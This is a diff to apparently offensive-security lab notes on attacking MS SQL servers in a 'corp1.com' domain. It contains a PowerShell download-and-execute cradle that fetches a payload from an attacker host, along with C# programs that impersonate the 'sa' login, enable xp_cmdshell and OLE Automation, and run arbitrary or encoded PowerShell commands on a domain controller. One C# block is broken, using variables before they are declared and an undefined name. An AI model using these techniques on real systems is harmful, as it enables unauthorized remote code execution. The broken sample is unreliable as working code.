@@ -202,7 +202,7 @@ We can Base64 encode a **PowerShell** command by invoking the following:
 
 ```powershell
 $lHost = ${LHOST}
-$command = "(Invoke-RestMethod -Uri 'http://${lHost}/PayloadAmsi.ps1' -UseBasicParsing) | Invoke-Expression"
+$command = "Invoke-RestMethod -Uri 'http://${lHost}/PayloadAmsi.ps1' -UseBasicParsing | Invoke-Expression"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedText = [Convert]::ToBase64String($bytes)
 ```
@@ -364,6 +364,125 @@ namespace SQL
             reader = command.ExecuteReader();
             reader.Read();
             Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+### Code execution
+
+A well-known technique is the MS SQL `xp_cmdshell` procedure, which might be
+disabled. With `sa` permissions, however, we can use the `sp_configure`
+procedure to enable the `xp_cmdshell` procedure, allowing us to execute
+arbitrary `cmd.exe` commands on the host. The following C# .NET code
+demonstrates this:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main()
+        {
+            string sqlServer = "dc01.corp1.com";
+            string database = "master";
+            string conString = "Server = " + sqlServer +
+                               "; Database = " + database +
+                               "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            string executeas = "EXECUTE AS LOGIN = 'sa';";
+            string enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+            string execCmd = "EXEC xp_cmdshell whoami";
+            command = new SqlCommand(executeas, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+			SqlCommand command = new SqlCommand(impersonateUser, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(enable_xpcmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Result of command is: " + reader[0]);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+An alternatively method that's not so well-known is to use the `sp_OAMethod`
+procedure to create and execute new procedure based on **Object Linked and
+Embedding (OLE)**. The following C# .NET code demonstrates how to create and
+invoke a new procedure in MS SQL to obtain arbitrary command execution:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string sqlServer = "dc01.corp1.com";
+            string database = "master";
+            string conString = "Server = " + sqlServer +
+                               "; Database = " + database +
+                               "; Integrated Security = True;";
+            string encodedCommand = args[0];
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            string executeas = "EXECUTE AS LOGIN = 'sa';";
+            string enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+            string execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -EncodedCommand {encodedCommand}\"';";
+
+            SqlCommand command = new SqlCommand(executeas, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(enable_ole, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
             reader.Close();
 
             con.Close();
